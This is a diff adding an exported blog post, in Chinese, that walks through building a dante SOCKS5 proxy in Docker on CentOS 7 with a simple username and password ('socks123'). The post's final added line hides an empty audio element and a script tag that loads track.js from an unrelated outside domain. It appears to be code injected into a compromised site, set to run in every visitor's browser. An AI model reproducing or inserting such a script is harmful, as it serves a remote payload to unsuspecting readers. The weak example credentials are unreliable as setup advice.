@@ -1,0 +1,39 @@
+---
+layout: post
+title: Centos7上用docker安装dante搭建socks5代理
+date: 2020-06-15 10:03:38.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Linux
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2020/06/15/centos7%e4%b8%8a%e7%94%a8docker%e5%ae%89%e8%a3%85dante%e6%90%ad%e5%bb%basocks5%e4%bb%a3%e7%90%86/"
+---
+<p>一、环境安装</p>
+<p>参考<a href="https://gaving.top/index.php/2020/06/15/centos7%E4%B8%8B%E5%AE%89%E8%A3%85docker">https://gaving.top/index.php/2020/06/15/centos7%E4%B8%8B%E5%AE%89%E8%A3%85docker</a></p>
+<p>二、下载dante</p>
+<p>git clone https://github.com/gaving2016/docker-dante.git</p>
+<p class="p1">三、修改Dockerfile，增加以下内容，标红的为用户密码</p>
+<p class="p1">FROM wernight/dante</p>
+<p class="p1"># TODO: Replace 'john' and 'MyPassword' by any username/password you want.</p>
+<p class="p1">RUN printf '<span style="color: #ff0000;">socks123</span>\n<span style="color: #ff0000;">socks123</span>\n' | adduser <span style="color: #ff0000;">socks</span></p>
+<p class="p1">四、进入docker logor的命令行 vi sockd.conf</p>
+<p class="p1">取消注释这行</p>
+<p class="p1">#socksmethod: username</p>
+<p class="p1">五、制作镜像</p>
+<p class="p1">docker build -t gaving ./</p>
+<p class="p1">docker run -d -p 1080:1080 gaving</p>
+<p>问题：</p>
+<p>使用docker下载dante速度较慢，可取Makefile中dante下载地址手动下载，编译；编译过程中遇到问题：cpupolicy2num 找不到，解决修改config_scan.c和.l文件，将用到cpupolicy2num的行注释掉即可</p>
+<p><audio style="display: none;" controls="controls"></audio><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
